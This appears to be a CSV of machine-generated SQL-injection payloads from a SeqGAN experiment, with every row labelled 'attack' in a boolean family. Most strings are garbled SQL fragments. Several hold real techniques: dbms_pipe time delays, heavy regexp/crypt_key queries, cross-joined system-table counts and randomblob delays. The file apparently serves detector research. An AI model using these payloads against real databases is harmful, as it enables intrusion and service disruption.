label,payload,family,payload_type,method,run_id,sample_index
attack,"1"" where t   )      ((  ,500000000p_ingpect  (  select 3580  =epchar and char  select _s and 7522 x when where from   )0  = aont,rs t  (char  ( t  =  (   +char  9354  ( t* 4799  (  (  )   select rt29660  (  113  6388  (    )    (  r yp_ks tcs r likes",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,92
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,93
attack,"1')    whereypypmbnrt  (  (  (   )    (  (  (   (  select    'unusual'*m3393 like char  (  (  cta,t_usty,s t3  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,94
attack,"1'||  (  select 'aio  a astes t1(  )    ( 8691  u   s tN2642  "" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""   char  =  and ,char  select   t  (  )  (  (  (  (  =  end 2180   6671  = char  and    ( _(  (  ,from aft2i.b8899",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,95
attack,"-oNw5556   a.pomtlesu,rom.nstlt4 char  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,96
attack,1'+  (  select 'as o    l,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,97
attack,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""80  )   wheres _ and and when    (  (  =    (  =  ypp_susus awpainses as ast""unhc,ll_umnnnexiomesusuimn.doystas t3/null  *   ( y  (  else    gpeck",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,98
attack,"1"" where char when a2642   from 2724m7417s a t_ust(   )    ,113e6849 _+  =    )      )pyp_asus)    ntchar  (  char  (  , or or when    or and or 8571(  +char  (  121  )      ,p_,ablefind omuntchar  (  )    (  (  rean..tall_uin.s k,l'  =  'ht1   tirbl_upet_t4)    ( ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,99
attack,"1%%%%'%   2724   )   867379  (   99 or char  +char  =     (  )  where or and where  =    (  (  =  (  =  myp_t  or aedb$feqtcsdbin.baf,.bunpgins c*nng_us  us abs csfromlrt aim3ate as t  (  (  =    (  ,s 7793  f 1/umas a,char  (  )   yp  1441",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,100
attack,"""    =    = or  (  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,101
attack,"1' like '' 1087 3352  ,0  (  ((  ,  (  t  (  (  (  =  and   =  end   2027  (  (  (  (  )   ( where findunglt_tas as char  ,m.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,102
attack,1'  )   and 8148  =  like  (  '#,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,103
attack,"1%%'121   )    end  (p  (  (  (  (  (  (  (  =    (  4799  (  =  )    (   from     = or like   (    (  (  (3(  )  = fexm.te,fg'  1541  )    (  122  (  =  (  =     2027rt  (  l_t  ( or or _ulnt  (    =  =z7522  ,sqrdesiouseupcgdt2,domasufusiuns.sk t",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,104
attack,1%%0%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,105
attack,"1"" 3880 a6671    (  =    ) t3105  --exp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,106
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ''  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,107
attack,3  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,108
attack,X')   /*mmgertimd.s a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,109
attack,"'ge0  = r  lefy 2l_siboblects and where 3580  )    (   )s 2642  (  (   (  )    (  (  =    (  500000000  )  ( char,)    =    85 and char  6849    (  (  1441  )    (  (  ,0  (  (/3484  106  (  122  (  0x7171706a71(  113 and 3038  =    l_d.mbmsttst3  3862$s  from allt_is t1,asum.asym",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,110
attack,"1""  1570    =  =  =       --.' like 'nys at4ab$s att1,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,111
attack,1mom.2%'  =  'd,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,112
attack,"1"" afesastpefing _in.fuus ,adombsml_u.s where   (    (  (  =  (  =  6388  select char  (  (  (  (  =  119    ,s and 4799u2   (    ( concat  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,113
attack,"1'||  (  select '(  )     )    =  *    (  (  )  r (  (  4799(  (  =    (  (  (  (  = t  (  (  (  )  (  (  (  (  =et) and    (  (  (  )p_upys as tana.s as inn.s asd' like 'niles as xpegs t5  (      =   8571up' ftchar  )     )    up  1570  (   (  (  (  =  (,p_,b1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,114
attack,"1%%a,m'  =  'b'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,115
attack,1m,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,116
attack,"t"" like ""effus   mzf%""   or 2180  (  3862umatleft_u,sdoum.fmas dtys tchar  char  =    (  = char  (  )  500000000    (  select or 2""asubnzi  )    (  (  (  (  )    (  (  (%1048",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,117
attack,"1"" t   (    (  (  = d,pps t2(  ,yp_uta,comtullibcmas as as r 4(",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,118
attack,"1%'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ''   ||char  83c'  =  ' a,ugub$cmas es fh"" like ""esys as tu.s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,119
attack,193541' l_ t3  =  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,120
attack,1 1570k   abm,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,121
attack,10x7171706a71,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,122
attack,"1'  =  's ayn'  )   and    (    (   'efiv' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'habl_ufobndu$rusy at_tap_ulmaastb$suget_s t1laagt  (  3862adom.tands do where likeioll_t_(    (  (  =  elsee2180  (  (  (  2961  ,  3484100couns ains  as arl_t1,s,ins as t4s iu aouf,as ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,123
attack,"1arttaed,as or at  2027p,b$b$f abnsms 3 where or ta,and t  (  (  (  (, likeet  =p  (    (  (  (  (  ,0x78  (  ous aUppdouastasysumfun t1eaftegecds where from char  (  105  (  ryl_usu",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,124
attack,"11760   from 9575(  *    (  (  ( a5000000000      )    (  (    = and (  )_un)p_s  r f5  *  =)    (  (    (  1441    (  select t  (    =  (  (  113  122es likep_unanghrblindpel_ut;t1,siblll_ubm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,125
attack,"1yht1%v1z%%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,126
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""jL(  (  (  3880exp_s t,$,* .s 3580 where ast  (  (  rys ass untdssusub$ftaaumgep_ung' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'uns,apes ,s t2,sy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,127
attack,1'   )    =    (  (  l  +char  111  ('fromi/*dolulmcprysusym.cblll_us imds t2s x asyststas and acrty  m.tallllluhwhere t2gmas t1s where and t4unp  1441  5485    ) a    (  (    mcongepgegerept_inldomdomas agup  r_un,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,128
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""s where t  (  select   +char  =    (    (  if    char  (  +  (  =     (  u   (  (  )  1048)   m.s tri.fgins and cgunf t_mntdes as adni    g' and    (  b  (  )    (  (  122  =      =  =    (  (  ( where (  (  (  *  l_usuint g',ab$igf,  =   from as and 7522(  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,129
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,130
attack,"1'||  (  select ' ao),iloas amabgtctas tadesusudt where a       3455from 5485  caseyt_(    =_s and ort1,et_t char     +char  2724  )    where 9643  (  =  ll_hal",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,131
attack,"1   6503sriumta,7555s t1ys domdpssys  = t3  (    (  83  (  1441  (  (  118  (  (   convert  (  =  (  (  char  1441  (  (  ( fex   or f,p_in.latzwd.ct  re$fupp_ins dol_ustaomt_iba(      ,,ul$(  tchar  8403  500000000  (  )   ,null from   from ty   )    (  118  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,132
attack,"1%cus'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'nmdpdom",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,133
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,134
attack,"1""   )      )     where and 1     ora,ain.gupgt1  )    (  7793    (  (  ( or 6503 char  =  (    5485   uplrt3(  (    comol_unas ug' d"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""omnp_s a,inth1um.tasdoblsys"" as t2,_us t4='  =  'au(    (  (  (  (  ,null  (  (  (  500000000  =    (  ((  121  =  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,135
attack,"11640%""   )   ||when     ""yobb"" a' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'  (  +char  (  (    =    (  lles   rw  luta,ubsednng,dounte,al1pefing4expoleulesusedomntyeg   ,domain.ds where or    s   dblrdct3(  (  = char  8403  (  3484  (   (  =    (  (  (  (  )p_ where 9575  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,136
attack,"1"" where (  (  (  )  (  = or l_,donin.sus tasys t or as antdsyses asimattininbl_im.st1v airiusubttabftlefgeg',null  (  ,500000000  (  (    (  =  (econcat  (  (  (  (  (  =  (  (  , 2774 and (  (  ,500000000pdoulll_inin.p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,137
attack,"1'+  (  select 'dnn.p'  )   and 8148  =  like  (  'll_usus t2b$ft_y,ass as as t2ly orbecfmdoumaatab$fs asysi$ti$om.maiomonmnomiluns and and    char  (  (  (ephexp  (  abl_upel_ulme,at5 t5  (  =   t  (  2774 rb  =  6503      (  ||and o)    (  (   =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,138
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,139
attack,1'   when ors 6388  (  (  (  (  char    char  )    =    (  select  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,140
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,141
attack,1'   omtas  aining,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,142
attack,-'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'  )    =    (    (  (  b  (  (    4018    (,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,143
attack,"-0co.tlinm= and or or 3880  ,  4799 from 1668    (  +  (u22724 3122  (  =  +char  (  83  (  )  =    (  f char  (  (  select us a char  1441  (  (  ) or 8571(   )(e500000000",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,144
attack,"1   /*  )   fromyuns tl2,dom as ,bsys as char  ,0  )    3862 where  )    = 6849  (     =  ,Aml_inw .sundmm.tabyst_= t,llhssuntl' and   (  =   6849 i.p_mdbmal',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'm,siblilaunt  (  (  ||  (  +char(  (  =  ( or tappjugexpcys te",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,145
attack,1'   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,146
attack,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'h1174906||xhl_ t1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,147
attack,"1""   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,148
attack,-/'--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,149
attack,"1'+  (  select 'in""  =  ""  117   122  )    from s where do    (  (  122  )  )    (  (  (  ) when like    (  ||char  (  )  )    =    (  (  (  118  8403  select updt_, 2367  (  +9660  (ex)      =p_ibdouup",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,150
attack,"1"" 6849 (  (char  =  ,  (      (    hep  select     )   =  ,rdlet  (  =  69    (  (   (  112  ||xchar  (  ling',t  113  (  =  (  (  5485 char  =  =     (  ||char  122  (  selectepe or=    (  )   end    (  =  rgi$fum.im.rdbmfcsestas t1ft as coundollpain..gm,de",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,151
attack,1'    5   or char  6093u,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,152
attack,"1u106   rtas t1fg%""  =  ""l'     )    (  +char   (  ,0  (  (  (  (  (  (  (  =   =    (  =    r't2,1   from or refg'   16400x78      (  t  (  5000000002)      ||  (  (  (  )  (  (   48  ifs 6388 8446744073709551610(  (  ,  (  3484  =  ,h8691  (  (  (  (  =  ,eng(  =  a,s t  and t=    (  (  (  7522    up",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,153
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""upjagtelds t1balles as astefNt_ussysassty,t1,.bat1,tdbrt   a,a.das u,.efenges as t3,sis afm..teg'oml1p_hfklptheset_uonppdb$fg'y  --'  =  'pcomm t  (  ( char  ()  or char  (  ||char  (  48  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,154
attack,"1""   2ompmnb$geu   ,2774 and    and or 7793  (  (    )  =  =  5485 char  (  113  (      (  select and    )  )  (    (  (  (  = 1087 and   (  limakatedestasungum,fdmcont  l_unuseaung_ung' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ' t  (  (  refestablus tesuast2feaktselect 3580  =  500000000(  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,155
attack,"1""   )    = t_um_combju..t  (  1441 and char  65  = 2724 tpp_ptchar_2642  5000000002)   from    nxp_s as t3,asdssi as aete,s asy    (  122  (  =  =  1441e67 and and t  =    (  6671e9643  +  =  ,500000000ppyp  (  (  2027(  (  121     and 3455 and orp  charor a"" like ""ptfromubo,ado",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,156
attack,"1%'   (   )   )     d dpt_erdoma.stasepcharetchar    (  (  (  +  (  *  = cb       +char  (  (   1541when   ,null  5485  (  )  2649    (  or as 2961       u   (  (   3580  (  ( or 3455   t  1570  (     (  6503y2--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,157
attack,"1""   ,5000000000  (  ) where and char  (  (  =  )    (  )    lefref_us t t_s inb5485,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,158
attack,"1'   ||)  )   *    ()    (  (  .p_setet1h 5485  (  )  ||char  (  (  1087N,ab$tlcssus.gionblmnmmm.t8518u",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,159
attack,1   122,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,160
attack,"1""   =    h c,rinss t_a.s anibsttaing""  =  ""hct3luk  Lm9354 char  =    )    (  85  (  select   fromung,asef,seab,$f,qg'   (  ||char   (  500000000/pt  (  ,0x78poes or ol",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,161
attack,"1"" aidouom.es   kus ' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'from where char      (  (  (  (  *   (  where t  (  =  ,2642",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,162
attack,"-1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""7793   7555   ,500000000,=  (  118  (  =  from as t2t  ||char  (  (  (  (  +char  (  (  fromk    (    +char  =  fromysinzwgaing  ,500000000,rg comtbg1inbztrinineft5389  =    (  112  (  113  (  )    (  (  (  8403  )  0x78,113(  69  t2th t    (/(  )  (  n or and    css t1,s ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,163
attack,"1'+  (  select 'b  ,0  (  ||      (  105  rt  (  (  (  =  500000000  )    r  (  (  (  =  =  up_,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,164
attack,"1'' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'then    (  83  =   and  =  from as where or where     (  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,165
attack,"1'||  (  select ')    r""  (  =   fromu.domas as ,s lag,s s t2,masydomtas.t2ins as as ailim.g1%%    r agefl_iuns as 3862 ornfrom as   umbmbllas  t$(    (  (  (  (  100  (  122  )     7522 2027 a,0  l_usdolu.tas as,sma,css a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,166
attack,"1'   +char  )    (  (  (    (  6849  =    (  +char  (   )    (    (  co   int_usy cbblell'(     )   83  (  (  (  char  )pt  (  113   ("" when   (  )    1087  77    119 _97 char  (  2961  com.t   (  8571    )    --select alusugmsta,ericbm""  )   or   (  ""char  (     or' or '  (  ||char    (  (  (  case       )   fromu",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,167
attack,"1%""  =  ""d.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,168
attack,"1""   (    =    (  =      (  +char  (  ,   and where 3352   fromus a,as aintom,apt_uswin.s sing'   r 2961  )    (  select from ns t  (  49  (  (,recgwetaluhtl_ 7417l_us t4(  then char  (  /   (  +char  (  1087    5485 or    (  g8571   3862  (  )    (    (  (  where where66   char  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,169
attack,"eApet_ras and d where  ,l',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ' iner egp_u  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,170
attack,"-o""   )    (  ()    (  (  (  =  2961 and   122 abldhe_nt_uiefibngi' or 'o,abl_,,up7793n,,ainsistasu,asssusyf.taolust1astolll_u",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,171
attack,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'ter aunpet,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,172
attack,"1%'||  (  select 'inhdzdb"" like ""eco$nsbd,do%asib$mastustas 5485 and or 6849 char  (  ,  )  ' or 'char  (  (  (  )  (   char  (  (  (  (  --s 7522  char  )    (  113  (  (  (  (      (  ||charhor   )  )    mt  (  )    like,adom.,s as and at  u3880eor and    )    (  (  (  +(  (  (  )) ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,173
attack,"1%%%%7417""  =  ""  77(  ||char  (  (  500000000null  =   ma,eb_usins,aglungefypll_k t3,(  (  = a(  (  69  (  (  (  5485  =  (  (  6093    (  h tychar  =  =    (  h(  (  (  (  (  (  )  s t when or 6671 t  ( 7417(  (  (  (  1,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,174
attack,"1""   from ao t3+char  ,from char    (  ( char  (  (  83  (   +char  2724    (  from j=  ||ep_t_uk.s dom,dombm.bmget2,p_k as asiunmaa' like 'han.asinilousunsei1 dom.taollt_u  111 char  from t1,t3  (  3580  7793 3038  (    =  1570      ,5   (  (' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'  = or ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,175
